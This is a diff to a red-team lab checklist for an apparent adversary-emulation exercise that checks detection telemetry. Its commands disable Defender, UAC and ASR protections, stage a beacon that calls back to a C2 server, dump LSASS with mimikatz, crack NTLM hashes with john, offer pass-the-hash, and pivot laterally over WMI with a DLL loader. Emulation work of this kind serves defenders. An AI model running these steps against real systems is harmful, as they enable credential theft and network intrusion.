@@ -2,7 +2,9 @@
 
 Executable order for the whole pass: **re-establish session 1 → discovery (beacon) → share artifact → decision →
 auth → credential access (real Mimikatz) → WMI lateral → session 2 → verify/cleanup**. One `run_id` threads S1→S9.
-Repo HEAD: `main` (≥ `681e442`). Every step lists the machine; swap `RUN-20260928-02` for your real run_id.
+This checklist reflects **C2-SIM v3.2** + the operator orchestrator `payloads/packaging/run_campaign_orchestrator.ps1`
+(`-Action Pre|WaitSession|P1|P2|Cmd|Run|Results|Artifacts|Stop`) — the old `stage/ws01/c2-console-phase2.ps1` /
+`run-phase2.ps1` names are gone. Swap `RUN-20260928-02` for your real run_id.
 
 ## 0. Build & preflight (C2 host / Kali + VMs)
 
@@ -18,14 +20,27 @@ New-Item -Force -ItemType Directory stage/ws01
 Copy-Item c0015_143_surrogate.dll stage\ws01\
 Copy-Item mimikatz.exe stage\ws01\
 ```
-Preflight gates (M-1): wmic on WS01; `it.admin` ∈ local Administrators on **FS01** and **WS01**
-(`runas /user:C0015\it.admin "cmd /c whoami /groups"`); Sysmon BALANCED loaded; Defender off
-(`Set-MpPreference -DisableRealtimeMonitoring $true`); audit (4624/4625/4648/4672/4688).
+Preflight gates (all REQUIRED this pass; run on the machines tagged):
+- `it.admin` ∈ local **Administrators on BOTH WS01 and FS01** (`runas /user:C0015\it.admin "cmd /c whoami /groups"` — must
+  show `SeDebugPrivilege`); add if missing: `net localgroup Administrators C0015\it.admin /add`.
+- WS01: **`EnableLUA=0`** (`reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
+  /t REG_DWORD /d 0 /f`) + **reboot** — otherwise `runas it.admin` gets a filtered token (no SeDebug) and S7b fails.
+- **3 machines (C2 host, WS01, FS01):** Tamper Protection OFF, then:
+  `Set-MpPreference -AttackSurfaceReductionRules_Ids "d1e49aac-8f56-4280-b9aa-9936ba642ffc" -AttackSurfaceReductionRules_Actions Disabled`
+  (ASR rule *"Block process creations originating from PSExec and WMI commands"* — it blocks the WMI pivot),
+  `Set-MpPreference -DisableRealtimeMonitoring $true`,
+  `Add-MpPreference -ExclusionProcess pwsh.exe,powershell.exe,cmd.exe,wmic.exe,rundll32.exe,mimikatz.exe`,
+  `Add-MpPreference -ExclusionPath C:\C0015,C:\stage,C:\Tools,C:\Users\Public\C0015,C:\ProgramData\C0015,E:\lab`.
+- FS01 only: **allow inbound WMI** — `Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
+  -Enabled True` (TCP 135 + RPC dynamic) or disable the firewall in the lab.
+- Sysmon BALANCED loaded; audit (4624/4625/4648/4672/4688).
 
-## 1. Start C2-SIM v3 + HTTP server (C2 host)
+## 1. Start C2-SIM v3.2 + HTTP server (C2 host) — or use the orchestrator
 
 ```powershell
-pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.1 -PublishDir build/out
+pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action Pre
+# Pre = make_config + stage copies + launch servers + Wait-Listeners (both :8080/:8000 up before returning)
+# manual equivalent: pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.1 -PublishDir build/out
 # verify: c2sim.log first line = "C2-SIM v3 listening ..." ; http://192.168.50.1:8000/c0015-comparefor.jpg -> 200
 ```
 
@@ -33,6 +48,7 @@ pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.1 -PublishDir 
 
 ```powershell
 pwsh -File payloads/packaging/make_config.ps1 -RunId RUN-20260928-02 -C2Host 192.168.50.1 -OutPath stage/ws01/config.ini
+# make_config now emits loop_count=0 (beacon runs forever — no mid-run death) and token_file=<Public>\token.txt
 Copy-Item payloads/hta/bootstrap.hta    stage\ws01\
 Copy-Item payloads/beacon/c0015_beacon.ps1 stage\ws01\
 # phase7 config (session 2) — copy the example, set the SAME run_id
@@ -67,6 +83,9 @@ markers `b64-marker.txt`, `js-marker.txt`, `c0015-comparefor.jpg`, `dll-executed
 ## 4. Get the session token (operator console)
 
 ```powershell
+# orchestrator (recommended): waits until session 1 appears and prints the token
+pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action WaitSession
+# manual:
 $tok = (Invoke-RestMethod "http://192.168.50.1:8080/sessions" | Where-Object stage -eq "phase3").token
 $tok   # S1-<16hex> — used for /cmd and /runbook below
 ```
@@ -74,10 +93,14 @@ $tok   # S1-<16hex> — used for /cmd and /runbook below
 ## 5. Discovery — play the kill-chain runbook (C2 host; beacon runs on WS01)
 
 ```powershell
+pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P2
+# P2 = enqueue runbook scripts/runbooks/c0015-phase2.json (11 entries) + wait for drain + artifact templates
+# manual:
 Invoke-RestMethod -Method Post -Uri "http://192.168.50.1:8080/runbook?session=$tok&name=c0015-phase2"
 Get-Content c2sim.log -Tail 30      # watch 11x task=OP-CMD ... result ... ok=True (accepted)
 ```
-Optional micro-manage: `Invoke-RestMethod -Method Post -Uri ".../cmd?session=$tok" -Body "net view /all"`.
+Optional micro-manage: `pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Run -Body "net view /all"`
+(posts `/cmd` + reads the output back via `/last`); dump all stored outputs with `-Action Results`.
 Verify (Elastic): E1 children of the beacon powershell; each `process.command_line` matches the tasked command.
 Collect evidence: `powershell -ExecutionPolicy Bypass -File .\collect_ws01_evidence.ps1 -SinceMinutes 30 -OutPath C:\Users\Public\c0015-evidence.json`
 
@@ -86,8 +109,9 @@ Collect evidence: `powershell -ExecutionPolicy Bypass -File .\collect_ws01_evide
 The runbook already tasks `net view \\FS01` (entry 10) and the ShareFinder write (entry 11) — if you played it in
 step 5, `C:\ProgramData\found_shares.txt` already exists on WS01. Otherwise task them now (remote, from C2):
 ```powershell
-Invoke-RestMethod -Method Post -Uri "http://192.168.50.1:8080/cmd?session=$tok" -Body "net view \\FS01"
-Invoke-RestMethod -Method Post -Uri "http://192.168.50.1:8080/cmd?session=$tok" -Body "powershell -NoProfile -Command `"Get-SmbShare | Out-File C:\ProgramData\found_shares.txt`""
+pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Run -Body 'net view \\FS01'
+pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Run -Body 'powershell -NoProfile -Command "Get-SmbShare | Out-File C:\ProgramData\found_shares.txt"'
+pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Results   # read the outputs (Finance/IT on \FS01)
 ```
 Verify (Elastic WS01): E1 with **parent = beacon powershell** (net.exe / powershell child) + E11
 `found_shares.txt` → DIRECT EVENT LINK. (Interactive fallback only if the beacon is unavailable — that drops the
@@ -121,19 +145,23 @@ net use /delete \\FS01\IPC$
 ## 9. S7b — credential access (REAL LSASS dump → obtain → crack; WS01 + Kali)
 
 ```powershell
-# 1) stage the real tool + run the REAL dump (WS01; password at the runas prompt only)
+# 1) REAL dump runs INTERACTIVELY (full token after EnableLUA=0; watch the NEW console)
 Copy-Item stage\ws01\mimikatz.exe \\WS01\C$\Tools\mimikatz.exe
-runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
+runas /user:C0015\it.admin "cmd /k C:\Tools\mimikatz.exe"
+# in the mimikatz console:  privilege::debug  ->  sekurlsa::logonpasswords
 ```
 2) In the console output, copy it.admin's line — it carries the **NTLM hash** (no plaintext on modern Windows).
-3) Crack it on KALI (transient file, delete after use):
+3) Crack it on KALI (transient file, delete after use) — **john** (Kali has no OpenCL for hashcat):
 ```bash
 echo -n '<NTLM_HASH>' > /tmp/itadmin.ntlm
-hashcat -m 1000 /tmp/itadmin.ntlm rockyou.txt --show     # or: john --format=nt /tmp/itadmin.ntlm
+john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/itadmin.ntlm
+john --format=nt --show /tmp/itadmin.ntlm     # if rockyou misses -> use the provisioned plaintext
 rm -f /tmp/itadmin.ntlm
 ```
-4) Use the **cracked plaintext** at the S8 `runas`/`wmic` prompt — the pivot credential now genuinely comes from
-   the dump (in-run only; never in repo/logs/ledger).
+4) Use the **cracked/provisioned plaintext** at any subsequent prompt — the pivot credential genuinely comes from
+   the exercise (in-run only; never in repo/logs/ledger).
+> NOTE: mimikatz through the beacon (`/cmd`) HANGS (real mimikatz is a REPL that reads stdin; `cmd /c` is
+> non-interactive) — the dump must run in the elevated console.
 Alternative (no crack): Pass-the-Hash on WS01 → `sekurlsa::pth /user:it.admin /domain:c0015.lab /ntlm:<hash>
 "cmd /c wmic /node:FS01 process call create ..."` (telemetry differs: no S4648; FS01 4624 from the forged logon).
 Verify (Elastic): WS01 S4648 (runas) + E1 mimikatz.exe (parent cmd) + E10 target lsass.exe; no mimikatz line in
@@ -146,12 +174,20 @@ Verify (Elastic): WS01 S4648 (runas) + E1 mimikatz.exe (parent cmd) + E10 target
 copy stage\ws01\c0015_143_surrogate.dll \\FS01\C$\C0015\
 copy payloads\beacon\c0015_beacon.ps1         \\FS01\C$\C0015\
 copy stage\ws01\config-phase7.ini             \\FS01\C$\C0015\config-phase7.ini
-# S8b WMI remote process (explicit it.admin; password at prompt)
-runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
 ```
-Fallback if wmic absent: `Invoke-CimMethod … -Credential (Get-Credential C0015\it.admin)` (record `PARTIAL`).
+S8b — **WMI remote process creation (T1047)**. Direct `rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry`
+via WMI returns **ReturnValue=9 "Path not found"** for ANY DLL (rundll32 is GUI subsystem and cannot init a
+window station in WMI's non-interactive session-0; proven with `user32.dll,MessageBeep`; `rundll32.exe` alone
+returns 0). Keep the WMI pivot but load the **SAME 143.dll** through a console-loader host:
+```powershell
+# stage the loader ON FS01 (loads c0015_143_surrogate.dll and calls LabEntry):
+#   C:\C0015\s8b_loader.ps1  =  P/Invoke kernel32 LoadLibrary/GetProcAddress -> LabEntry
+# then from the elevated WS01 console:
+runas /user:C0015\it.admin "cmd /k wmic /node:FS01 process call create \"cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\C0015\s8b_loader.ps1\""
+# -> ReturnValue=0, ProcessId=<pid>  (run RUN-20260930-01: ProcessId=964)
+```
 `python scripts/lab_tools.py artifact-new ART-06-01 RUN-20260928-02 6 7 --payload stage/ws01/remote-process.json -o stage/ws01/art06_01.json`
-Gate (4): FS01 rundll32 process / identity (S4648 + FS01 S4624/4672 same FS01 LogonId) / DLL hash / callback S9.
+Gate (4): FS01 process created via WMI / identity (S4648 + FS01 S4624/4672 same FS01 LogonId) / DLL hash / callback S9.
 
 ## 11. S9 — session 2 (automatic after S8b)
 
@@ -159,8 +195,8 @@ Gate (4): FS01 rundll32 process / identity (S4648 + FS01 S4624/4672 same FS01 Lo
 Get-ChildItem evidence/run-ledger | Sort-Object LastWriteTime | Select-Object -Last 5   # ART-07-01-<token8>.json
 Get-Content c2sim.log -Tail 10                                                          # register phase7-session2 ok=True + T-DISCOVER-CORPUS result
 ```
-Verify (Elastic FS01): E1 rundll32 (same ProcessGuid as S8b), **E7** `C:\C0015\c0015_143_surrogate.dll`
-(hash = ART-06-01), E11 `c0015_143-executed.txt`, E3 → `192.168.50.1:8080`.
+Verify (Elastic FS01): E1 `cmd/powershell` (console-loader, parent `wmiprvse.exe`), **E7** `C:\C0015\c0015_143_surrogate.dll`
+(hash = ART-06-01; loaded by the loader host, NOT rundll32), E11 `c0015_143-executed.txt`, E3 → `192.168.50.1:8080`.
 Acceptance: **server-side ART-07-01 receipt + callback telemetry in the same run** — marker alone is NOT enough.
 
 ## 12. Verify & cleanup
@@ -169,8 +205,8 @@ Acceptance: **server-side ART-07-01 receipt + callback telemetry in the same run
   playbook (ProcessGuid same-host; FS01 4624↔4672 by FS01 LogonId; never 4648↔4624 by LogonId).
 - Record ledger rows S1–S9 under the one run_id (statuses in allowed vocabulary).
 ```powershell
-pwsh -File payloads/packaging/launch_servers.ps1 -Stop
+pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Stop   # stop C2-SIM + HTTP
 Remove-Item -Recurse -Force C:\Users\Public\C0015, "$env:USERPROFILE\Desktop\test.docm"   # WS01
 Remove-Item -Recurse -Force C:\C0015, C:\Tools\mimikatz.exe                                # FS01/WS01
-# Re-enable Defender + restore routine Sysmon profile.
+# Re-enable Defender + ASR rule + restore routine Sysmon profile + re-enable WMI firewall block.
 ```
